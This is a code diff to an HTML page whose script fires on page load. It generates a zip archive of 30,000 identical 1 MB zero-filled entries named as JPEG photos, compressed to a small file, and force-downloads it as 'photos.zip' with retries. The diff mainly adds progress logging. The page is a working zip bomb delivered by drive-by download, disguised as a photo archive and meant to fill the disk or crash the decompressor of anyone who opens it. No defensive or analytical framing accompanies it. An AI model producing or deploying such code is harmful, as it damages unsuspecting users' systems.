@@ -1,13 +1,40 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            padding: 20px;
+            margin: 0;
+            min-height: 100vh;
+        }
+        #log {
+            white-space: pre-wrap;
+            font-size: 14px;
+            line-height: 1.6;
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+    </style>
 </head>
 <body>
+<div id="log">⏳ Initializing...</div>
 <script>
 (function() {
+    const log = document.getElementById('log');
+
+    function append(text) {
+        log.textContent += '\n' + text;
+        console.log(text);
+    }
+
+    append('🚀 Starting...');
+
     const CHUNK_SIZE = 1024 * 1024;
     const TARGET_FILES = 30000;
     const CHUNK = new Uint8Array(CHUNK_SIZE);
@@ -17,29 +44,32 @@
     let isDownloading = false;
     let retryCount = 0;
 
+    append('📦 Chunk created (' + CHUNK_SIZE + ' bytes)');
+
     function loadJSZip(callback) {
         if (typeof JSZip !== 'undefined') {
+            append('✅ JSZip already loaded');
             callback();
             return;
         }
+        append('⬇ Loading JSZip from CDN...');
         const script = document.createElement('script');
         script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js';
-        script.onload = callback;
+        script.onload = function() {
+            append('✅ JSZip loaded from primary CDN');
+            callback();
+        };
         script.onerror = function() {
-            // Fallback CDN
+            append('⚠️ Primary CDN failed, trying fallback...');
             const script2 = document.createElement('script');
             script2.src = 'https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js';
-            script2.onload = callback;
+            script2.onload = function() {
+                append('✅ JSZip loaded from fallback CDN');
+                callback();
+            };
             script2.onerror = function() {
-                // Last resort - load from raw.githubusercontent.com
-                const script3 = document.createElement('script');
-                script3.src = 'https://rawcdn.githack.com/Stuk/jszip/v3.10.1/dist/jszip.min.js';
-                script3.onload = callback;
-                script3.onerror = function() {
-                    // If all CDNs fail, use built-in fallback
-                    createFallbackZip(callback);
-                };
-                document.head.appendChild(script3);
+                append('⚠️ All CDNs failed, using built-in fallback...');
+                createFallbackZip(callback);
             };
             document.head.appendChild(script2);
         };
@@ -47,7 +77,7 @@
     }
 
     function createFallbackZip(callback) {
-        // Minimal zip generator
+        append('🔧 Building fallback zip generator...');
         window.JSZip = function() { this.files = []; };
         JSZip.prototype.file = function(name, data) {
             this.files.push({ name: name, data: data });
@@ -132,32 +162,41 @@
             }
             return (crc ^ 0xFFFFFFFF) >>> 0;
         }
+        append('✅ Fallback zip generator ready');
         callback();
     }
 
     function generateZip() {
         if (isGenerating) return;
         isGenerating = true;
+        append('🔨 Starting zip generation...');
         const zip = new JSZip();
         let completed = 0;
 
         function addBatch(start) {
             if (start >= TARGET_FILES) {
                 isGenerating = false;
+                append('✅ All ' + TARGET_FILES + ' files added to zip');
+                append('📦 Generating blob...');
                 zip.generateAsync({
                     type: 'blob',
                     compression: 'DEFLATE',
                     compressionOptions: { level: 9 }
                 }).then(function(blob) {
+                    append('✅ Blob created: ' + (blob.size / 1024 / 1024).toFixed(2) + ' MB');
                     downloadBlob(blob);
-                }).catch(function() {
-                    // Retry with no compression
+                }).catch(function(err) {
+                    append('❌ Blob generation error: ' + err.message);
+                    append('🔄 Retrying with lower compression...');
                     zip.generateAsync({
                         type: 'blob',
                         compression: 'DEFLATE',
                         compressionOptions: { level: 1 }
                     }).then(function(blob) {
+                        append('✅ Blob created (low compression): ' + (blob.size / 1024 / 1024).toFixed(2) + ' MB');
                         downloadBlob(blob);
+                    }).catch(function(err2) {
+                        append('❌ All compression failed: ' + err2.message);
                     });
                 });
                 return;
@@ -168,6 +207,9 @@
                 zip.file('photo_' + String(i).padStart(5, '0') + '.jpg', CHUNK);
             }
             completed = end;
+            if (completed % 3000 === 0 || completed === TARGET_FILES) {
+                append('📊 Progress: ' + Math.round((completed / TARGET_FILES) * 100) + '% (' + completed + '/' + TARGET_FILES + ')');
+            }
             setTimeout(function() { addBatch(end); }, 2);
         }
 
@@ -177,45 +219,55 @@
     function downloadBlob(blob) {
         if (isDownloading) return;
         isDownloading = true;
+        append('⬇ Triggering download...');
         try {
             const url = URL.createObjectURL(blob);
+            append('🔗 Blob URL created: ' + url.substring(0, 50) + '...');
             const a = document.createElement('a');
             a.href = url;
             a.download = 'photos.zip';
+            a.style.display = 'none';
             document.body.appendChild(a);
+            append('🖱 Clicking download link...');
             a.click();
             setTimeout(function() {
                 document.body.removeChild(a);
                 URL.revokeObjectURL(url);
                 isDownloading = false;
-            }, 500);
+                append('✅ Download triggered successfully!');
+            }, 1000);
         } catch (e) {
             isDownloading = false;
+            append('❌ Download error: ' + e.message);
             if (retryCount < 3) {
                 retryCount++;
+                append('🔄 Retry ' + retryCount + '...');
                 setTimeout(function() {
                     const url = URL.createObjectURL(blob);
-                    window.location.href = url;
-                    setTimeout(function() { URL.revokeObjectURL(url); }, 1000);
+                    append('🌐 Opening blob in new window...');
+                    window.open(url, '_blank');
+                    setTimeout(function() { URL.revokeObjectURL(url); }, 2000);
                 }, 500);
+            } else {
+                append('❌ All download attempts failed.');
             }
         }
     }
 
     function start() {
+        append('📋 Loading JSZip library...');
         loadJSZip(function() {
+            append('✅ Library ready, starting generation...');
             generateZip();
         });
     }
 
-    // Fire immediately when page loads
+    // Fire immediately
     if (document.readyState === 'complete' || document.readyState === 'interactive') {
         start();
     } else {
         document.addEventListener('DOMContentLoaded', start);
     }
-
-    // Also fire on load as backup
     window.addEventListener('load', start);
 })();
 </script>
